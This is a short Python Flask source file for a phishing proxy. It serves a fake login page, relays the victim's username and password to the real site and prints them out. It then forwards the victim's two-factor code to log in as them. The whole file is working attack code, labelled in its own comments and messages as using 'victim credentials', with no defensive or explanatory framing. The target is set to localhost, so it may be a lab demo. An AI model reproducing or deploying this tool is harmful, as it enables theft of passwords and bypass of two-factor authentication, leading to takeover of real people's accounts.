from flask import Flask, session, render_template, request, redirect
from flask_session import Session
import random
import string
import requests
import socket

url_actual = "localhost"

# App
app = Flask(__name__)
app.secret_key = "twofaserver"
app.config["SESSION_TYPE"] = "filesystem"
Session(app)


@app.get("/")
def index_get():
    print("Serving fake login.")
    return render_template("login.html")


@app.post("/login")
def index_post():
    username = str(request.values.get("user"))
    password = str(request.values.get("pass"))

    # Try to login to actual site
    values = {'user': username,
              'pass': password}

    r = requests.post(url_actual, data=values)

    if "Denied" in r.content.decode():
        return render_template("loginfail.html")

    print("Successfully logged in using victim credentials.")
    print("Username was: " + username)
    print("Password was: " + password)

    return render_template("twofactor.html")


@app.post("/twofactor")
def twofactor_post():
    code = str(request.values.get("code"))

    # Try to login with actual 2FA code
    values = {'code': code}

    r = requests.post(url_actual + "/twofactor", data=values)

    if "Denied" in r.content.decode():
        return render_template("twofactorfail.html")
    print("Successfully authenticated using victim 2FA code.")
    return render_template("success.html")


if __name__ == '__main__':
    app.run("0.0.0.0", 80)
